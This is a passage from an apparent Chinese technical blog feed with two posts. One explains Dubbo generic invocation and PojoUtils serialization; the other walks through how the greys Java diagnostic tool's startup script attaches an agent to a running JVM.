class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.dubbo.rpc.service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通用服务接口</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> william.liangf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@export</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GenericService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 泛化调用</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 方法名，如：findPerson，如果有重载方法，需带上参数列表，如：findPerson(java.lang.String)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parameterTypes 参数类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args 参数列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable 方法抛出的异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Object $invoke(String method, String[] parameterTypes, Object[] args) <span class="keyword">throws</span> GenericException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PojoUtils"><a href="#PojoUtils" class="headerlink" title="PojoUtils"></a>PojoUtils</h3><blockquote><p>PojoUtils. Travel object deeply, and convert complex type to simple type.</p></blockquote><p>simple type包含primitive type, String, Number(Integer, Long), Date, Array of Primitive type, collection等</p><p>举一个简单的例子, java类User定义如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span>  String name;</span><br><span class="line">    <span class="keyword">private</span> Date birthDay;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> age, String name, Date birthDay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.birthDay = birthDay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthDay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthDay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthDay</span><span class="params">(Date birthDay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthDay = birthDay;</span><br><span class="line">    &#125;</span><br><span class="line">将hashmap结构的参数转换成对应的pojo</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Address <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(Address address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ReflectionToStringBuilder.toString(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;￼￼ ￼ ￼ ￼ ￼ ￼￼</span><br></pre></td></tr></table></figure><p>序列化代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object generalized = PojoUtils.generalize(user);</span><br><span class="line"> System.out.println(<span class="string">"generalized = "</span> + JSON.toJSONString(generalized));</span><br></pre></td></tr></table></figure><p>generalize之后其实是一个<code>hashmap</code>, 写成json字符串之后如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;birthDay&quot;: 1525258281516,</span><br><span class="line">    &quot;address&quot;: &#123;</span><br><span class="line">        &quot;zipCode&quot;: 10086,</span><br><span class="line">        &quot;street&quot;: &quot;haidian street&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;com.air.rmi.dubbo.bean.Address&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;name&quot;: &quot;Kevin&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;com.air.rmi.dubbo.bean.User&quot;,</span><br><span class="line">    &quot;age&quot;: 26</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="相关filters"><a href="#相关filters" class="headerlink" title="相关filters"></a>相关filters</h3><ul><li><code>GenericFilter</code>: 负责provider端参数的转换.</li></ul><ol><li>调用时,将hashmap结构的参数转换成对应的pojo</li><li>返回结果时, 将pojo转换成hashmap</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用时</span></span><br><span class="line">args = PojoUtils.realize(args, params, method.getGenericParameterTypes()</span><br><span class="line"><span class="comment">// 返回结果时</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> RpcResult(PojoUtils.generalize(result.getValue()));</span><br></pre></td></tr></table></figure><ul><li><code>GenericImplFilter</code>: 负责consumer端参数的转换, 将POJO转换成hashmap结构</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object[] args = PojoUtils.generalize(arguments);</span><br></pre></td></tr></table></figure><p>这样consumer端传过来的只是一个map, 并不要有provider端的jar包, 根据这个就可以实现dubbo接口的测试平台.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://dubbo.incubator.apache.org/books/dubbo-user-book/demos/generic-reference.html" rel="external nofollow noopener noreferrer" target="_blank">6.16 泛化引用 · GitBook</a></li><li><a href="https://www.jianshu.com/p/ff0947529de4" rel="external nofollow noopener noreferrer" target="_blank">Dubbo高级特性实践-泛化调用 - 简书</a></li><li><a href="https://zhuanlan.zhihu.com/p/29410596" rel="external nofollow noopener noreferrer" target="_blank">dubbo高级用法之泛化与接口自适应</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;泛接口调用方式主要用于客户端没有API接口及模型类元的情况，参数及返回值中的所有POJO均用Map表示，通常用于框
      
    
    </summary>
    
      <category term="dubbo" scheme="http://qsli.github.io/categories/dubbo/"/>
    
    
      <category term="generic" scheme="http://qsli.github.io/tags/generic/"/>
    
  </entry>
  
  <entry>
    <title>greys启动分析</title>
    <link href="http://qsli.github.io/2018/04/02/greys-start/"/>
    <id>http://qsli.github.io/2018/04/02/greys-start/</id>
    <published>2018-04-01T17:31:53.000Z</published>
    <updated>2018-08-11T12:42:41.596Z</updated>
    
    <content type="html"><![CDATA[<h1 id="greys-简介"><a href="#greys-简介" class="headerlink" title="greys 简介"></a>greys 简介</h1><p>greys的使用参见链接： <a href="/2017/11/12/greys/" title="使用greys来排查线上问题">使用greys来排查线上问题</a></p><h1 id="greys-sh"><a href="#greys-sh" class="headerlink" title="greys.sh"></a>greys.sh</h1><p>一般使用greys时，启动命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat -H ./greys.sh [pid]</span><br></pre></td></tr></table></figure><p><code>greys.sh</code>的最后一行<code>main &quot;${@}&quot;</code>将命令行的所有参数都传给了main函数， 看main函数的实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"PUJC"</span> ARG</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$&#123;ARG&#125;</span> <span class="keyword">in</span></span><br><span class="line">        P) OPTION_CHECK_PERMISSION=0;;</span><br><span class="line">        U) OPTION_UPDATE_IF_NECESSARY=0;;</span><br><span class="line">        J) OPTION_ATTACH_JVM=0;;</span><br><span class="line">        C) OPTION_ACTIVE_CONSOLE=0;;</span><br><span class="line">        ?) usage;<span class="built_in">exit</span> 1;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>首先脚本使用<code>getopts</code>来获取命令行的参数， 指定解析<code>-P</code>、<code>-U</code>、<code>-J</code>、<code>-C</code>这几个参数，设置一些flag。<br>注意下case语句中的<code>？</code>， 代表无法识别的命令行参数, 这时就打印出help，然后退出程序：</p><blockquote><p>The GNU getopt command uses the GNU getopt() library function to do the parsing of the arguments and options.</p></blockquote><blockquote><p>If getopt() does not recognize an option character, it prints an error message to stderr, stores the character in optopt, and returns ?. The calling program may prevent the error message by setting opterr to 0.</p></blockquote><p>然后greys.sh这个脚本会检查greys的版本是否有更新， 除了检查更新就是<code>attach jvm</code>和<code>active console</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;OPTION_ATTACH_JVM&#125;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">    attach_jvm <span class="variable">$&#123;greys_local_version&#125;</span>\</span><br><span class="line">        || exit_on_err 1 <span class="string">"attach to target jvm(<span class="variable">$&#123;TARGET_PID&#125;</span>) failed."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;OPTION_ACTIVE_CONSOLE&#125;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">    active_console <span class="variable">$&#123;greys_local_version&#125;</span>\</span><br><span class="line">        || exit_on_err 1 <span class="string">"active console failed."</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><code>${OPTION_ATTACH_JVM}</code>和<code>${OPTION_ACTIVE_CONSOLE}</code>的默认值都是1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># the option to control greys.sh attach target jvm</span></span><br><span class="line">OPTION_ATTACH_JVM=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># the option to control greys.sh active greys-console</span></span><br><span class="line">OPTION_ACTIVE_CONSOLE=1</span><br></pre></td></tr></table></figure><h1 id="attach-jvm分析"><a href="#attach-jvm分析" class="headerlink" title="attach jvm分析"></a>attach jvm分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">attach_jvm()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">local</span> greys_lib_dir=<span class="variable">$&#123;GREYS_LIB_DIR&#125;</span>/<span class="variable">$&#123;1&#125;</span>/greys</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if [ $&#123;TARGET_IP&#125; = $&#123;DEFAULT_TARGET_IP&#125; ]; then</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -z <span class="variable">$&#123;TARGET_PID&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java \</span><br><span class="line">            <span class="variable">$&#123;BOOT_CLASSPATH&#125;</span> <span class="variable">$&#123;JVM_OPTS&#125;</span> \</span><br><span class="line">            -jar <span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar \</span><br><span class="line">                -pid <span class="variable">$&#123;TARGET_PID&#125;</span> \</span><br><span class="line">                -target <span class="variable">$&#123;TARGET_IP&#125;</span><span class="string">":"</span><span class="variable">$&#123;TARGET_PORT&#125;</span> \</span><br><span class="line">                -core <span class="string">"<span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar"</span> \</span><br><span class="line">                -agent <span class="string">"<span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-agent.jar"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>attach jvm这个函数，就是调用 greys-core这个jar包，  jar包执行时会调用指定的<code>Main-Class</code>的的main方法。<br><code>Main-Class</code>在<code>META-INF</code>中指定， 查看文件的内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  greys  unzip -q -c greys-core.jar  META-INF/MANIFEST.MF</span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line">Created-By: Apache Maven</span><br><span class="line">Built-By: vlinux</span><br><span class="line">Build-Jdk: 1.8.0_91</span><br><span class="line">Main-Class: com.github.ompc.greys.core.GreysLauncher</span><br></pre></td></tr></table></figure><p>因此执行这个jar包后，会调用<code>GreysLauncher</code>的main方法。</p><h2 id="attach到jvm过程"><a href="#attach到jvm过程" class="headerlink" title="attach到jvm过程"></a>attach到jvm过程</h2><p><code>GreysLauncher</code>在main函数中做了两件事情，一是解析命令行配置， 二是attach到具体的jvm上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> GreysLauncher(args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        System.err.println(<span class="string">"start greys failed, because : "</span> + getCauseMessage(t));</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">GreysLauncher</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">    Configure configure = analyzeConfigure(args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent</span></span><br><span class="line">    attachAgent(configure);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件就是脚本中指定的参数，主要有如下字段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String targetIp;                <span class="comment">// 目标主机IP</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> targetPort;                 <span class="comment">// 目标进程号</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> javaPid;                    <span class="comment">// 对方java进程号</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> connectTimeout = <span class="number">6000</span>;      <span class="comment">// 连接超时时间(ms)</span></span><br><span class="line"><span class="keyword">private</span> String greysCore;               <span class="comment">// greys-core.jar的位置</span></span><br><span class="line"><span class="keyword">private</span> String greysAgent;              <span class="comment">// greys-agent.jar的位置</span></span><br></pre></td></tr></table></figure><h3 id="attach原理"><a href="#attach原理" class="headerlink" title="attach原理"></a>attach原理</h3><img src="/2018/04/02/greys-start/attach.jpg" title="jps实现原理"><p>我们在用<code>jstack</code>命令查看jvm的线程dump的时候，经常看到这两个进程，一个是<code>&quot;Signal Dispatcher&quot;</code>, 另外一个是<code>&quot;Attach Listener&quot;</code>;<br>这两个线程就和attach功能密切相关。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os_prio=0 tid=0x00007f23b80d2800 nid=0xb82e runnable [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line">&quot;Attach Listener&quot; #28 daemon prio=9 os_prio=0 tid=0x00007f2328001000 nid=0x3bb5 waiting on condition [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br></pre></td></tr></table></figure><p><code>Signal Dispatcher</code>负责响应<code>SIGQUIT</code>, 并创建 <code>Attach Listener</code>。<code>Attach Listener</code>负责建立通信，执行相应的命令。</p><p>attach jvm就是根据<code>com.sun.tools.attach.VirtualMachine</code>的接口提供的方法——<code>attach</code>和<code>loadAgent</code></p><h3 id="GreysLauncher"><a href="#GreysLauncher" class="headerlink" title="GreysLauncher"></a>GreysLauncher</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Object vmObj = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> == attachVmdObj) &#123; <span class="comment">// 使用 attach(String pid) 这种方式</span></span><br><span class="line">              vmObj = vmClass.getMethod(<span class="string">"attach"</span>, String.class).invoke(<span class="keyword">null</span>, <span class="string">""</span> + configure.getJavaPid());</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              vmObj = vmClass.getMethod(<span class="string">"attach"</span>, vmdClass).invoke(<span class="keyword">null</span>, attachVmdObj);</span><br><span class="line">          &#125;</span><br><span class="line">          vmClass.getMethod(<span class="string">"loadAgent"</span>, String.class, String.class).invoke(vmObj, configure.getGreysAgent(), configure.getGreysCore() + <span class="string">";"</span> + configure.toString());</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> != vmObj) &#123;</span><br><span class="line">              vmClass.getMethod(<span class="string">"detach"</span>, (Class&lt;?&gt;[]) <span class="keyword">null</span>).invoke(vmObj, (Object[]) <span class="keyword">null</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>通过上面的代码， <code>greys-core.jar</code>和<code>greys-agent.jar</code>这两个jar包就被引入到了jvm</p><blockquote><p>The loadAgent method is used to load agents that are written in the Java Language and deployed in a JAR file. (See java.lang.instrument for a detailed description on how these agents are loaded and started).</p></blockquote><p><code>loadAgent</code>会将<code>greys-core.jar</code>和<code>greys-agent.jar</code>两个jar包引入进来。jar包引入后会从<code>/META-INF/MANIFEST.MF</code>中读取配置的agent类。</p><h2 id="agent启动过程"><a href="#agent启动过程" class="headerlink" title="agent启动过程"></a>agent启动过程</h2><p>agent有两种启动方式，一种再jvm启动的时候一起启动， 一种是动态的attach到一个运行的jvm上。</p><h3 id="随启动参数启动"><a href="#随启动参数启动" class="headerlink" title="随启动参数启动"></a>随启动参数启动</h3><p>以agent形式启动需要在jvm启动参数添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:btrace-agent.jar</span><br></pre></td></tr></table></figure><p>这种加载方式需要实现下面两个接口中的一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JVM先尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果上面的方法不存在，则尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>同时必须在<code>MANIFEST.MF</code>中包含<code>Premain-Class</code>指定对应的类。</p><h3 id="动态attach的方式启动"><a href="#动态attach的方式启动" class="headerlink" title="动态attach的方式启动"></a>动态attach的方式启动</h3><p>attach形式需要实现下面的两个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 首先尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 上面的方法不存在，会尝试调用这个方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>同时在Jar包中必须指定 <code>Agent-Class</code>, 因此当此jar包被加载时，jvm会从<code>/META-INF/MANIFEST.MF</code>中读取配置的<code>Premain-Class</code>和<code>Agent-Class</code>, <code>greys-agent</code>的信息显示如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line">Created-By: Apache Maven</span><br><span class="line">Built-By: vlinux</span><br><span class="line">Build-Jdk: 1.8.0_91</span><br><span class="line">Agent-Class: com.github.ompc.greys.agent.AgentLauncher</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.github.ompc.greys.agent.AgentLauncher</span><br></pre></td></tr></table></figure><p>因此入口定位在<code>AgentLauncher</code>。</p><h3 id="AgentLauncher"><a href="#AgentLauncher" class="headerlink" title="AgentLauncher"></a>AgentLauncher</h3><p><code>AgentLauncher</code>的主要完成了一下的功能：</p><pre><code>- 自定义类加载器，减少对现有工程的侵蚀- 启动一个`GaServer`监听指定的端口</code></pre><p><code>GaServer</code>读取用户的输入的命令， 将命令交给<code>CommandHandler</code>在新的线程中进行具体的处理。</p><h1 id="active-console分析"><a href="#active-console分析" class="headerlink" title="active console分析"></a>active console分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># active console</span></span><br><span class="line"><span class="comment"># $1 : greys_local_version</span></span><br><span class="line">active_console()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">local</span> greys_lib_dir=<span class="variable">$&#123;GREYS_LIB_DIR&#125;</span>/<span class="variable">$&#123;1&#125;</span>/greys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java 2&gt;&amp;1 &gt;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use default console</span></span><br><span class="line">        <span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/java \</span><br><span class="line">            -cp <span class="variable">$&#123;greys_lib_dir&#125;</span>/greys-core.jar 